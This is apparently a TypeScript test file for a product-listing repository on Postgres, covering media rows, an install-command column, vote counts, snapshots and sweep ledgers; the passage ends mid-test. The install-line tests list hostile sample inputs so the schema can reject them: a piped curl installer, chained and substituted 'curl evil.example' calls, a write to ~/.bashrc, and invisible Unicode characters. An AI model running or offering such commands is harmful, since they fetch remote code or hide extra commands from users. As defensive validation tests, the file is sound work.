// The openproduct repository against a live engine — the media model and rows, the install line, the clean-vote mark, snapshots and their floor, the sweep ledger, the capture queue, the catalogue.
//
// MD0/MD1/MD4's media plane, PV2–PV4, LI0's ledger, OS2's floor and corpus reads, the comment's tag, and OS5's materialised catalogue.
//
// Cut from `repository-pg.test.ts` at openproduct-verification OV3, verbatim:
// the engine, the ids and the two seeds come from `./harness.js`, which
// restores the ladder's template per test instead of re-applying fifty
// migrations. Nothing a test asserts changed; what it costs did.

import { describe, expect, it } from "vitest";

import { asUuid } from "../ids.js";
import { sql, repo, ORG, PROJECT, PROJECT_TWO, PROFILE, PROFILE_TWO, OPENING, ACTOR, NOW, seedDraft, seedPublished, usePgEngine } from "./harness.js";

usePgEngine();

describe("MD0 — the media model", () => {
  const HERO = asUuid("aaaaaaaa-0000-4000-8000-000000000001");
  const SHOT = asUuid("aaaaaaaa-0000-4000-8000-000000000002");
  const AT = "2026-08-20T00:00:00.000Z";

  /** Insert straight into the table: MD0 lands the MODEL, and the write path
   *  is MD1's (gated on WC-C). What is being proved here is the schema. */
  async function put(over: Record<string, unknown> = {}) {
    const row = {
      id: HERO,
      profile_id: PROFILE,
      kind: "hero",
      storage_ref: "op-media/abc",
      alt_text: "The kettle dashboard, showing a queue at rest",
      width: 1200,
      height: 630,
      position: 0,
      observed_at: null,
      ...over,
    };
    return sql.execute(
      `INSERT INTO openproduct.product_media
         (id, profile_id, kind, storage_ref, alt_text, width, height, position, observed_at)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
      [
        row.id,
        row.profile_id,
        row.kind,
        row.storage_ref,
        row.alt_text,
        row.width,
        row.height,
        row.position,
        row.observed_at,
      ],
    );
  }

  it("reads a listing's media back in DOCUMENT order: hero, gallery, capture", async () => {
    await seedPublished();
    // Inserted deliberately out of order, so passing means the ORDER BY did
    // the work rather than the insertion sequence.
    await put({ id: SHOT, kind: "screenshot", observed_at: AT, alt_text: "An automated capture" });
    await put({ id: asUuid("aaaaaaaa-0000-4000-8000-000000000012"), kind: "gallery", position: 2 });
    await put();
    await put({ id: asUuid("aaaaaaaa-0000-4000-8000-000000000010"), kind: "gallery", position: 0 });

    const media = await repo.listPublicMedia(PROFILE);
    expect(media.map((m) => `${m.kind}:${m.position}`)).toEqual([
      "hero:0",
      "gallery:0",
      "gallery:2",
      "screenshot:0",
    ]);
    // And the moment travels with the capture and with nothing else.
    expect(media.map((m) => m.observedAt)).toEqual([null, null, null, AT]);
  });

  it("is invisible on a draft, addressed by profile id directly", async () => {
    // The rule every public child read on this estate holds: it re-asserts the
    // parent's visibility rather than trusting the caller to have arrived
    // through a public read.
    await seedDraft();
    await put();
    expect(await repo.listPublicMedia(PROFILE)).toEqual([]);
    expect(await repo.listPublicMediaForSlugs(["acme-thing"])).toEqual(new Map());
  });

  it("is invisible once a listing is hidden by moderation", async () => {
    await seedPublished();
    await put();
    expect(await repo.listPublicMedia(PROFILE)).toHaveLength(1);
    await sql.execute(
      `UPDATE openproduct.profiles
          SET moderation_state = 'removed', moderated_at = $2
        WHERE id = $1`,
      [PROFILE, NOW],
    );
    expect(await repo.listPublicMedia(PROFILE)).toEqual([]);
  });

  it("answers the whole directory in one read, keyed by slug", async () => {
    await seedPublished();
    await seedPublished(PROFILE_TWO, PROJECT_TWO, "other-thing");
    await put();
    await put({ id: asUuid("aaaaaaaa-0000-4000-8000-000000000020"), profile_id: PROFILE_TWO });

    const bySlug = await repo.listPublicMediaForSlugs(["acme-thing", "other-thing"]);
    expect([...bySlug.keys()].sort()).toEqual(["acme-thing", "other-thing"]);
    expect(bySlug.get("acme-thing")).toHaveLength(1);
  });

  describe("WC-3, as a CHECK constraint", () => {
    it("refuses an authored image carrying a moment", async () => {
      await seedPublished();
      // The failure this prevents: a hero with an `observedAt` renders in a
      // frame that says something measured it, which is a freshness claim
      // about a picture its maker chose.
      await expect(put({ observed_at: AT })).rejects.toThrow(/product_media_provenance_check/);
    });

    it("refuses a capture with no moment", async () => {
      await seedPublished();
      // And the other direction — an undated screenshot is the exact artefact
      // OPC-7's whole frame exists to keep off a page.
      await expect(put({ id: SHOT, kind: "screenshot", observed_at: null })).rejects.toThrow(
        /product_media_provenance_check/,
      );
    });

    it("refuses a kind that is not one of the three", async () => {
      await seedPublished();
      await expect(put({ kind: "banner" })).rejects.toThrow(/product_media_kind_check/);
    });
  });

  describe("what a row must carry to exist at all", () => {
    it("refuses blank alt text, whitespace included", async () => {
      await seedPublished();
      // Whitespace is what a form posts when somebody tabs past the field, and
      // it reads as present to every naive check.
      await expect(put({ alt_text: "   " })).rejects.toThrow(/product_media_alt_check/);
    });

    it("refuses an image with no dimensions", async () => {
      await seedPublished();
      // A performance decision, not a completeness one: an <img> with unknown
      // dimensions is how a 0.0000 CLS gets lost, and the model has nowhere to
      // put one.
      await expect(put({ width: 0 })).rejects.toThrow(/product_media_dimensions_check/);
    });

    it("keeps the singleton kinds at position zero", async () => {
      await seedPublished();
      await expect(put({ position: 3 })).rejects.toThrow(/product_media_position_check/);
    });
  });

  describe("one hero, one capture, and no two images in the same slot", () => {
    it("refuses a second hero", async () => {
      await seedPublished();
      await put();
      await expect(put({ id: asUuid("aaaaaaaa-0000-4000-8000-0000000000ff") })).rejects.toThrow(
        /openproduct_product_media_slot/,
      );
    });

    it("refuses two gallery images claiming the same position", async () => {
      await seedPublished();
      await put({ id: asUuid("aaaaaaaa-0000-4000-8000-000000000031"), kind: "gallery", position: 1 });
      await expect(
        put({ id: asUuid("aaaaaaaa-0000-4000-8000-000000000032"), kind: "gallery", position: 1 }),
      ).rejects.toThrow(/openproduct_product_media_slot/);
    });

    it("lets the SAME listing hold a hero and a capture at once", async () => {
      // The index is over (profile_id, kind, position), so the singletons are
      // per kind rather than per listing — the thing an over-eager unique
      // index would break.
      await seedPublished();
      await put();
      await put({ id: SHOT, kind: "screenshot", observed_at: AT, alt_text: "An automated capture" });
      expect(await repo.listPublicMedia(PROFILE)).toHaveLength(2);
    });
  });

  describe("the gallery ceiling", () => {
    async function fill(n: number) {
      for (let at = 0; at < n; at += 1) {
        await put({
          id: asUuid(`aaaaaaaa-0000-4000-8000-0000000001${String(at).padStart(2, "0")}`),
          kind: "gallery",
          position: at,
        });
      }
    }

    it("takes eight and refuses the ninth", async () => {
      await seedPublished();
      // The boundary in both directions — an off-by-one here is a ceiling that
      // is really seven or really nine.
      await fill(8);
      expect(await repo.listPublicMedia(PROFILE)).toHaveLength(8);
      await expect(
        put({ id: asUuid("aaaaaaaa-0000-4000-8000-000000000199"), kind: "gallery", position: 99 }),
      ).rejects.toThrow(/at most 8 images/);
    });

    it("counts per listing, not across the table", async () => {
      await seedPublished();
      await seedPublished(PROFILE_TWO, PROJECT_TWO, "other-thing");
      await fill(8);
      // A second listing is unaffected by the first one being full, which is
      // the bug a ceiling written as a table-wide count would have.
      await expect(
        put({
          id: asUuid("aaaaaaaa-0000-4000-8000-000000000201"),
          profile_id: PROFILE_TWO,
          kind: "gallery",
          position: 0,
        }),
      ).resolves.toBeDefined();
    });

    it("does not count a row against itself on UPDATE", async () => {
      // A trigger that forgot `id <> NEW.id` would make the eighth image
      // un-editable — it would count itself as the ninth.
      await seedPublished();
      await fill(8);
      await expect(
        sql.execute(
          `UPDATE openproduct.product_media SET alt_text = $2 WHERE id = $1`,
          [asUuid("aaaaaaaa-0000-4000-8000-000000000107"), "A corrected description"],
        ),
      ).resolves.toBeDefined();
    });
  });

  it("goes with the listing when the listing goes", async () => {
    // teardown.md row 10 is one DROP SCHEMA, and the cascade is what keeps a
    // deleted listing from leaving media rows pointing at nothing.
    await seedPublished();
    await put();
    await sql.execute(`DELETE FROM openproduct.profiles WHERE id = $1`, [PROFILE]);
    const left = await sql.execute<{ n: string }>(
      `SELECT count(*)::text AS n FROM openproduct.product_media`,
    );
    expect(left.rows[0]!.n).toBe("0");
  });

  it("holds no address, and the I3 query covers it without being extended", async () => {
    // openproduct holds no address (I3). A media table is where one would
    // arrive as an "uploaded by" contact, so the same information_schema guard
    // AC0 wrote is asked about this table too.
    const cols = await sql.execute<{ column_name: string }>(
      `SELECT column_name FROM information_schema.columns
        WHERE table_schema = 'openproduct' AND table_name = 'product_media'`,
    );
    expect(cols.rows.map((r) => r.column_name).sort()).toEqual([
      "alt_text",
      "created_at",
      "height",
      "id",
      "kind",
      "observed_at",
      "position",
      "profile_id",
      "storage_ref",
      "width",
    ]);
  });
});

// ---------------------------------------------------------------------------
// PV2 — the install line (openproduct-worldclass)
// ---------------------------------------------------------------------------
//
// The one column on this table whose contents a reader is invited to RUN, so
// the constraint is a security control rather than data hygiene. `install.ts`
// refuses the same shapes and gives a maintainer one reason at a time; this is
// the same rule at the column, for DQ1's stated reason — a future write path
// that forgets is still a write path.

describe("PV2 — the install line", () => {
  async function set(line: string | null) {
    return sql.execute(`UPDATE openproduct.profiles SET install_line = $2 WHERE id = $1`, [
      PROFILE,
      line,
    ]);
  }

  it("stores the commands a maintainer actually types", async () => {
    await seedDraft();
    for (const line of [
      "npx create-kettle",
      "docker run -p 8080:8080 ghcr.io/acme/kettle:latest",
      "uvx kettle",
      "go install github.com/acme/kettle@latest",
    ]) {
      await expect(set(line)).resolves.toBeDefined();
    }
    const profile = await repo.getProfileForOrg(ORG, PROFILE);
    expect(profile?.installLine).toBe("go install github.com/acme/kettle@latest");
  });

  it("carries through the public read, in the maintainer's own words", async () => {
    await seedPublished();
    await set("npx create-kettle");
    expect((await repo.getPublicProfile("acme-thing"))?.installLine).toBe("npx create-kettle");
  });

  it("clears to NULL rather than to an empty string", async () => {
    // Absent is NULL. An empty string would be a maintainer who answered with
    // nothing, which is a different sentence from not answering — and would
    // render an empty box.
    await seedDraft();
    await set("npx create-kettle");
    await set(null);
    expect((await repo.getProfileForOrg(ORG, PROFILE))?.installLine).toBeNull();
    await expect(set("   ")).rejects.toThrow(/profiles_install_line_check/);
  });

  describe("one command, not a script", () => {
    it("refuses the piped installer", async () => {
      // The category this whole rule exists for: a reader cannot see what a
      // piped installer runs before it runs.
      await seedDraft();
      await expect(set("curl https://example.com/install.sh | sh")).rejects.toThrow(
        /profiles_install_line_check/,
      );
    });

    it("refuses a second command hiding after an innocuous first", async () => {
      await seedDraft();
      await expect(set("npm i kettle; curl evil.example")).rejects.toThrow(
        /profiles_install_line_check/,
      );
      await expect(set("npm i kettle && curl evil.example")).rejects.toThrow(
        /profiles_install_line_check/,
      );
    });

    it("refuses substitution and redirection", async () => {
      await seedDraft();
      await expect(set("npx $(curl evil.example)")).rejects.toThrow(/profiles_install_line_check/);
      await expect(set("echo x > ~/.bashrc")).rejects.toThrow(/profiles_install_line_check/);
    });

    it("refuses a newline, which would make it a script", async () => {
      await seedDraft();
      await expect(set("npm i kettle\ncurl evil.example")).rejects.toThrow(
        /profiles_install_line_check/,
      );
    });
  });

  it("refuses the invisible characters a reviewer cannot catch", async () => {
    // A zero-width space between `npm` and `i` reads as an ordinary command in
    // the studio, in the box and in review, and copies into a terminal as
    // something else.
    await seedDraft();
    await expect(set(`npm${String.fromCharCode(0x200b)} i kettle`)).rejects.toThrow(
      /profiles_install_line_check/,
    );
    await expect(set(`npm i ${String.fromCharCode(0x202e)}elttek`)).rejects.toThrow(
      /profiles_install_line_check/,
    );
  });

  it("holds at the ceiling and refuses past it", async () => {
    // 160, the same number `install.ts` holds. The boundary in both
    // directions — an off-by-one is a ceiling that is really 159 or 161.
    await seedDraft();
    await expect(set("n".repeat(160))).resolves.toBeDefined();
    await expect(set("n".repeat(161))).rejects.toThrow(/profiles_install_line_check/);
  });
});

// ---------------------------------------------------------------------------
// PV3 — the clean-vote mark (openproduct-worldclass)
// ---------------------------------------------------------------------------
//
// The claim is narrow and the tests are about what does NOT happen: the ratio
// is computed where the rows are, and the count of discounted endorsements
// reaches `countEndorsements`'s caller and nothing else.

describe("PV3 — the clean-vote mark", () => {
  async function endorse(subject: string, discounted = false) {
    await repo.endorse(PROFILE, subject, "confirmed", NOW);
    if (discounted) {
      await sql.execute(
        `INSERT INTO openproduct.endorsement_integrity (profile_id, subject_id, reason, decided_by)
         VALUES ($1, $2, 'ring', 'usr_sweep')
         ON CONFLICT DO NOTHING`,
        [PROFILE, subject],
      );
    }
  }

  it("counts the discounted ones separately from the total", async () => {
    await seedPublished();
    for (let at = 0; at < 8; at += 1) await endorse(`usr_ok_${at}`);
    for (let at = 0; at < 2; at += 1) await endorse(`usr_bad_${at}`, true);

    const counts = await repo.countEndorsements(PROFILE, NOW);
    // The total is what it always was — discounted rows do not count toward it.
    expect(counts.total).toBe(8);
    // And the discounted ones are now visible TO THE SERVER, which is the
    // only place they ever are.
    expect(counts.discounted).toBe(2);
  });

  it("keeps the total identical to what it was before PV3 widened the query", async () => {
    // The refactor moved `i.profile_id IS NULL` from the WHERE clause into a
    // FILTER so the discounted rows could be counted rather than dropped. If
    // that changed the total, every public upvote count on the estate would
    // have moved with it.
    await seedPublished();
    for (let at = 0; at < 5; at += 1) await endorse(`usr_p_${at}`);
    await endorse("usr_q_0", true);
    expect((await repo.countEndorsements(PROFILE, NOW)).total).toBe(5);
  });

  it("records the mark on the profile, and it is a boolean", async () => {
    await seedPublished();
    await repo.setCleanVotes(PROFILE, true);
    expect((await repo.getPublicProfile("acme-thing"))?.cleanVotes).toBe(true);
    await repo.setCleanVotes(PROFILE, false);
    expect((await repo.getPublicProfile("acme-thing"))?.cleanVotes).toBe(false);
  });

  it("defaults to false, which is the ordinary state", async () => {
    // Most listings have too few upvotes to check. A listing nobody has voted
    // on carries no mark, and that is not a finding about it.
    await seedPublished();
    expect((await repo.getPublicProfile("acme-thing"))?.cleanVotes).toBe(false);
  });

  it("publishes NO per-listing suppression count anywhere in the public shape", async () => {
    // PV3's done-when, asserted rather than reasoned about. EN3's fifth
    // decision is the same rule one level down: nothing per-person is ever
    // exposed, and a per-listing count is a short step from it.
    await seedPublished();
    for (let at = 0; at < 8; at += 1) await endorse(`usr_v_${at}`);
    await endorse("usr_w_0", true);
    await repo.setCleanVotes(PROFILE, true);

    const profile = await repo.getPublicProfile("acme-thing");
    const json = JSON.stringify(profile);
    expect(json).not.toMatch(/discount/i);
    expect(json).not.toMatch(/suppress/i);
    expect(Object.keys(profile ?? {})).not.toContain("discounted");
  });

  it("holds no column that could carry one", async () => {
    // The information_schema guard AC0 wrote, asked about the shape PV3 chose:
    // the answer to "how many were set aside" is a boolean column, and there
    // is no integer beside it that a future projection could reach for.
    const cols = await sql.execute<{ column_name: string }>(
      `SELECT column_name FROM information_schema.columns
        WHERE table_schema = 'openproduct' AND table_name = 'profiles'
          AND column_name LIKE '%discount%'`,
    );
    expect(cols.rows).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// PV4 — snapshots (openproduct-worldclass)
// ---------------------------------------------------------------------------
//
// Three claims, and the first is the one that decides whether the feature is
// honest at all:
//
//   THE BASELINE IS STRICTLY OLDER. Today's own row is never its own baseline
//   — that would make every diff empty and the whole site look inert.
//
//   ONE ROW PER LISTING PER DAY. The sweep runs every ten minutes; without the
//   primary key this table would hold 144 rows a day per listing and a "week
//   ago" comparison would read a moment ten minutes back.
//
//   A SNAPSHOT IS NOT AN AUDIT TRAIL. It holds the public projection and
//   nothing else: no actor, no draft, no private field, no moderation state.

describe("PV4 — snapshots", () => {
  const DAY_1 = "2026-08-10";
  const DAY_2 = "2026-08-17";
  const DAY_3 = "2026-08-24";

  describe("the baseline is strictly older than the day asked about", () => {
    it("does not answer today's own row", async () => {
      // The defect this rules out: `<=` instead of `<`. Every diff would come
      // back empty and the page would say nothing ever changes here.
      await seedPublished();
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:00:00.000Z`, { tagline: "Now" });
      expect(await repo.latestSnapshotBefore(PROFILE, DAY_2)).toBeNull();
    });

    it("answers the most recent row that IS older, not the oldest", async () => {
      await seedPublished();
      await repo.recordSnapshot(PROFILE, DAY_1, `${DAY_1}T00:00:00.000Z`, { tagline: "First" });
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:00:00.000Z`, { tagline: "Second" });
      const baseline = await repo.latestSnapshotBefore(PROFILE, DAY_3);
      expect(baseline?.fields).toEqual({ tagline: "Second" });
      expect(baseline?.takenAt).toBe(`${DAY_2}T00:00:00.000Z`);
    });

    it("answers null for a listing that has never been snapshotted", async () => {
      // NOT an empty object. `diffSnapshots` turns null into no section at
      // all; an empty object would diff every field as having been cleared.
      await seedPublished();
      expect(await repo.latestSnapshotBefore(PROFILE, DAY_3)).toBeNull();
    });
  });

  describe("one row per listing per day, and the day holds its latest shape", () => {
    it("does not accumulate a row per sweep", async () => {
      await seedPublished();
      for (let at = 0; at < 5; at += 1) {
        await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T0${at}:00:00.000Z`, { tagline: `v${at}` });
      }
      const rows = await sql.execute<{ n: string }>(
        `SELECT count(*) AS n FROM openproduct.profile_snapshots WHERE profile_id = $1`,
        [PROFILE],
      );
      expect(Number(rows.rows[0]?.n)).toBe(1);
    });

    it("keeps the LAST shape of the day, not the first", async () => {
      // `DO UPDATE`, not `DO NOTHING`. A week-ago comparison should read where
      // the listing GOT to that day, and a maintainer who edits at noon would
      // otherwise be compared against their 00:10 state a week later.
      await seedPublished();
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:10:00.000Z`, { tagline: "Morning" });
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T23:50:00.000Z`, { tagline: "Evening" });
      expect((await repo.latestSnapshotBefore(PROFILE, DAY_3))?.fields).toEqual({
        tagline: "Evening",
      });
    });
  });

  describe("what the table may hold, and what it may not", () => {
    it("refuses a snapshot that is not an object", async () => {
      // An array or a scalar is a shape `diffSnapshots` cannot read, and the
      // CHECK constraint finds it on write rather than on somebody's page.
      await seedPublished();
      await expect(
        sql.execute(
          `INSERT INTO openproduct.profile_snapshots (profile_id, taken_on, fields)
           VALUES ($1, $2::date, '[]'::jsonb)`,
          [PROFILE, DAY_2],
        ),
      ).rejects.toThrow(/profile_snapshots_fields_object/);
    });

    it("holds no column an audit trail would need", async () => {
      // The information_schema guard AC0 wrote, asked about PV4's shape. A
      // snapshot says what a listing's PAGE said; an actor column here would
      // make it a record of who did what, which is a different table with
      // different rules and a different retention story.
      const cols = await sql.execute<{ column_name: string }>(
        `SELECT column_name FROM information_schema.columns
          WHERE table_schema = 'openproduct' AND table_name = 'profile_snapshots'
          ORDER BY column_name`,
      );
      expect(cols.rows.map((r) => r.column_name)).toEqual([
        "fields",
        "profile_id",
        "taken_at",
        "taken_on",
      ]);
    });

    it("goes with the listing when the listing goes", async () => {
      // CASCADE — a listing's history is part of the listing, and `teardown.md`
      // row 10 is one DROP SCHEMA.
      await seedPublished();
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:00:00.000Z`, { tagline: "Here" });
      await sql.execute(`DELETE FROM openproduct.profiles WHERE id = $1`, [PROFILE]);
      const rows = await sql.execute<{ n: string }>(
        `SELECT count(*) AS n FROM openproduct.profile_snapshots`,
      );
      expect(Number(rows.rows[0]?.n)).toBe(0);
    });
  });

  describe("what the sweep takes a snapshot OF", () => {
    it("lists only what is publicly listed", async () => {
      // A delisted or private listing accumulates no history: a snapshot is
      // the public projection at a moment, and a listing with no public
      // projection has no moment to record.
      await seedDraft();
      expect(await repo.listPublicProfilesForSnapshot()).toEqual([]);
      await seedPublished(PROFILE_TWO, PROJECT_TWO, "beta-thing");
      expect((await repo.listPublicProfilesForSnapshot()).map((r) => r.slug)).toEqual([
        "beta-thing",
      ]);
    });
  });

  describe("the digest's pairs", () => {
    it("drops a listing with no snapshot before the week", async () => {
      // The first-snapshot rule, applied to the digest instead of to a page.
      // A listing whose history starts inside the window has nothing to be
      // compared against, and rendering it as all-new would put "everything
      // about this product changed" in a weekly summary.
      await seedPublished();
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:00:00.000Z`, { tagline: "New here" });
      expect(await repo.listSnapshotPairsInWindow(DAY_2, DAY_3)).toEqual([]);
    });

    it("pairs the last snapshot before the week with the last one in it", async () => {
      await seedPublished();
      await repo.recordSnapshot(PROFILE, DAY_1, `${DAY_1}T00:00:00.000Z`, { tagline: "Before" });
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:00:00.000Z`, { tagline: "Middle" });
      await repo.recordSnapshot(PROFILE, DAY_3, `${DAY_3}T00:00:00.000Z`, { tagline: "After" });

      // The window is [DAY_2, DAY_3+1): DAY_1 is the baseline, DAY_3 the end.
      const pairs = await repo.listSnapshotPairsInWindow(DAY_2, "2026-08-25");
      expect(pairs).toHaveLength(1);
      expect(pairs[0]?.slug).toBe("acme-thing");
      expect(pairs[0]?.from).toEqual({ tagline: "Before" });
      expect(pairs[0]?.to).toEqual({ tagline: "After" });
    });

    it("looks for the baseline in the week before the window, not in the whole history (OS5)", async () => {
      // OS2 records every listed listing once a day, so the eve's row is the
      // baseline for every listing the sweep reached; a week of lookback
      // covers a sweep that missed days. A listing whose last snapshot before
      // the window is OLDER than that is absent from the week's digest — the
      // same rule as a listing with no history — rather than the read walking
      // every snapshot ever taken to find it (OS0: 6.5 s at a year).
      await seedPublished();
      const eight = "2026-08-09"; // DAY_2 minus eight days: outside the lookback
      await repo.recordSnapshot(PROFILE, eight, `${eight}T00:00:00.000Z`, { tagline: "Long ago" });
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:00:00.000Z`, { tagline: "In the week" });
      expect(await repo.listSnapshotPairsInWindow(DAY_2, DAY_3)).toEqual([]);
      // The eve itself — the row OS2 guarantees — is inside it.
      const eve = "2026-08-16";
      await repo.recordSnapshot(PROFILE, eve, `${eve}T00:00:00.000Z`, { tagline: "The eve" });
      const pairs = await repo.listSnapshotPairsInWindow(DAY_2, DAY_3);
      expect(pairs).toHaveLength(1);
      expect(pairs[0]?.from).toEqual({ tagline: "The eve" });
      // And the edge of the lookback is inside it too (seven days before the window's first day).
      await sql.execute(`DELETE FROM openproduct.profile_snapshots WHERE taken_on = $1::date`, [eve]);
      const edge = "2026-08-10";
      expect(await repo.listSnapshotPairsInWindow(DAY_2, DAY_3)).toEqual([]);
      await repo.recordSnapshot(PROFILE, edge, `${edge}T00:00:00.000Z`, { tagline: "The edge" });
      expect((await repo.listSnapshotPairsInWindow(DAY_2, DAY_3))[0]?.from).toEqual({ tagline: "The edge" });
    });

    it("does not pair a listing that has stopped being public", async () => {
      await seedPublished();
      await repo.recordSnapshot(PROFILE, DAY_1, `${DAY_1}T00:00:00.000Z`, { tagline: "Before" });
      await repo.recordSnapshot(PROFILE, DAY_2, `${DAY_2}T00:00:00.000Z`, { tagline: "After" });
      await sql.execute(`UPDATE openproduct.profiles SET visibility = 'private' WHERE id = $1`, [
        PROFILE,
      ]);
      expect(await repo.listSnapshotPairsInWindow(DAY_2, DAY_3)).toEqual([]);
    });
  });
});

describe("openproduct — a phase that fails says so, in a column (openproduct-worldclass-v2 LI0)", () => {
  const T1 = "2026-09-09T18:00:00.000Z";
  const T2 = "2026-09-09T18:10:00.000Z";

  it("reads seven phases, each never run on a fresh estate", async () => {
    // Five when LI0 wrote this; OS2 made the snapshot phase the sixth by
    // giving it the singleton row the health document requires; OS5 made the
    // catalogue the seventh, the same way.
    const states = await repo.getSweepPhaseStates();
    expect(Object.keys(states).sort()).toEqual(["board", "catalogue", "defence", "digest", "integrity", "searchIndex", "snapshots"]);
    for (const state of Object.values(states)) {
      expect(state).toEqual({ lastRunAt: null, lastError: null, lastErrorAt: null });
    }
  });

  it("a failure is recorded beside the floor without touching it; a success clears it", async () => {
    await repo.recordSweepOutcomes(
      [{ phase: "searchIndex", ok: false, reason: "internal_error: Search index rebuild failed (503)" }],
      T1,
    );
    let index = (await repo.getSweepPhaseStates()).searchIndex;
    expect(index.lastRunAt).toBeNull();
    expect(index.lastError).toBe("internal_error: Search index rebuild failed (503)");
    expect(index.lastErrorAt).toBe(T1);

    await repo.replaceSearchIndex("product", [], T2);
    await repo.recordSweepOutcomes([{ phase: "searchIndex", ok: true, reason: null }], T2);
    index = (await repo.getSweepPhaseStates()).searchIndex;
    expect(index.lastRunAt).toBe(T2);
    expect(index.lastError).toBeNull();
    expect(index.lastErrorAt).toBeNull();
  });

  // OPN-11. `built_at` moves only when the index is rebuilt, and it is rebuilt
  // only when something dirtied it — so on an empty or quiet catalogue it
  // froze, and `/health` called the phase stale while it ran on every tick.
  it("a clean check is the index phase's run, and it leaves the floor alone (OPN-11)", async () => {
    const T3 = "2026-09-09T18:20:00.000Z";
    await repo.replaceSearchIndex("product", [], T1);
    await repo.markSearchIndexChecked(T2);
    expect((await repo.getSweepPhaseStates()).searchIndex.lastRunAt).toBe(T2);
    // `built_at` is still the rebuild floor, and a check is not a build.
    expect(await repo.getSearchIndexState()).toEqual({ builtAt: T1, dirtyAt: null });

    // A rebuild after the check is the later of the two, and so the run.
    await repo.replaceSearchIndex("product", [], T3);
    expect((await repo.getSweepPhaseStates()).searchIndex.lastRunAt).toBe(T3);
  });

  it("a check on a DIRTY index records nothing — it is not current", async () => {
    await repo.replaceSearchIndex("product", [], T1);
    await repo.markSearchIndexDirty(T1);
    await repo.markSearchIndexChecked(T2);
    expect((await repo.getSweepPhaseStates()).searchIndex.lastRunAt).toBe(T1);
  });

  it("a check on an index never built is still never run", async () => {
    // The seed row is dirty from birth, so this is the guard and the GREATEST
    // together: no build, no clean check, no run.
    await repo.markSearchIndexChecked(T2);
    expect((await repo.getSweepPhaseStates()).searchIndex.lastRunAt).toBeNull();
  });

  it("a success on a phase whose floor another handler owns does not invent a run", async () => {
    await repo.recordSweepOutcomes([{ phase: "integrity", ok: true, reason: null }], T1);
    expect((await repo.getSweepPhaseStates()).integrity.lastRunAt).toBeNull();
    await repo.markIntegritySwept(T2);
    expect((await repo.getSweepPhaseStates()).integrity.lastRunAt).toBe(T2);
    // OS2's phase is the same shape: the handler marks the floor when the
    // day's rows are written, and the ledger's "ok" may not invent that.
    await repo.recordSweepOutcomes([{ phase: "snapshots", ok: true, reason: null }], T1);
    expect((await repo.getSweepPhaseStates()).snapshots.lastRunAt).toBeNull();
    await repo.markSnapshotSwept(T2);
    expect((await repo.getSweepPhaseStates()).snapshots.lastRunAt).toBe(T2);
  });

  it("the board and digest cuts have no other writer, so their success IS the run", async () => {
    await repo.recordSweepOutcomes(
      [
        { phase: "board", ok: true, reason: null },
        { phase: "digest", ok: false, reason: "digest: http_503" },
      ],
      T1,
    );
    const states = await repo.getSweepPhaseStates();
    expect(states.board).toEqual({ lastRunAt: T1, lastError: null, lastErrorAt: null });
    expect(states.digest).toEqual({ lastRunAt: null, lastError: "digest: http_503", lastErrorAt: T1 });
  });

  it("a failure survives a database restored without its seed row", async () => {
    await sql.execute(`DELETE FROM openproduct.defence_sweep_state`, []);
    await repo.recordSweepOutcomes([{ phase: "defence", ok: false, reason: "defence: thrown" }], T1);
    expect((await repo.getSweepPhaseStates()).defence.lastError).toBe("defence: thrown");
  });

  it("there can only ever be one row per phase", async () => {
    await expect(
      sql.execute(`INSERT INTO openproduct.board_sweep_state (singleton) VALUES (FALSE)`),
    ).rejects.toThrow();
    await expect(
      sql.execute(`INSERT INTO openproduct.digest_sweep_state (singleton) VALUES (TRUE)`),
    ).rejects.toThrow();
  });
});

// ---------------------------------------------------------------------------
// OS2 — the snapshot sweep's floor, and the two reads that replaced 2N
// ---------------------------------------------------------------------------
//
// PV4's phase read each listing back one at a time and had no floor. The
// handler test in `tests/core` counts the calls; what is proved HERE is that
// the two batched reads return what the per-listing reads did, and that the
// floor row behaves like EN3's and TS4's.

describe("OS2 — the snapshot floor", () => {
  it("is seeded null, which is never-run, which is due", async () => {
    expect(await repo.getSnapshotSweptAt()).toBeNull();
  });

  it("records an instant and reads it back as ISO", async () => {
    await repo.markSnapshotSwept("2026-09-10T00:05:00.000Z");
    expect(await repo.getSnapshotSweptAt()).toBe("2026-09-10T00:05:00.000Z");
  });

  it("upserts, so a database restored without the seed row still records", async () => {
    // EN3's reason, word for word: without the seed row an UPDATE would touch
    // nothing, the floor would never record, and the phase would snapshot on
    // every tick forever — the defect arriving through its own fix's absence.
    await sql.execute(`DELETE FROM openproduct.snapshot_sweep_state`);
    await repo.markSnapshotSwept("2026-09-10T00:05:00.000Z");
    expect(await repo.getSnapshotSweptAt()).toBe("2026-09-10T00:05:00.000Z");
  });

  it("holds exactly one row, by constraint", async () => {
    await expect(
      sql.execute(`INSERT INTO openproduct.snapshot_sweep_state (singleton, swept_at) VALUES (FALSE, now())`),
    ).rejects.toThrow(/snapshot_sweep_state_singleton/);
  });
});

describe("OS2 — two reads for the corpus", () => {
  it("returns the same profiles the per-listing read did, fully hydrated", async () => {
    await seedPublished();
    await seedPublished(PROFILE_TWO, PROJECT_TWO, "beta-thing");
    const batch = await repo.listPublicProfilesForSnapshot();
    expect(batch.map((p) => p.slug)).toEqual(["acme-thing", "beta-thing"]);
    // Every field the snapshot projection reads is present — the batch is the
    // same row the single read returned, not a thinner one.
    const single = await repo.getPublicProfile("acme-thing");
    expect(batch[0]).toEqual(single);
  });

  it("excludes a listing that is not publicly listed", async () => {
    await seedPublished();
    await sql.execute(`UPDATE openproduct.profiles SET visibility = 'private' WHERE id = $1`, [PROFILE]);
    expect(await repo.listPublicProfilesForSnapshot()).toEqual([]);
  });

  it("counts open roles per listing in one read, and omits listings with none", async () => {
    await seedPublished();
    await seedPublished(PROFILE_TWO, PROJECT_TWO, "beta-thing");
    await repo.upsertRoleOpening({ id: OPENING, profileId: PROFILE, title: "Design lead" });
    await repo.upsertRoleOpening({
      id: asUuid("88888888-8888-4888-8888-888888888888"),
      profileId: PROFILE,
      title: "Docs",
    });
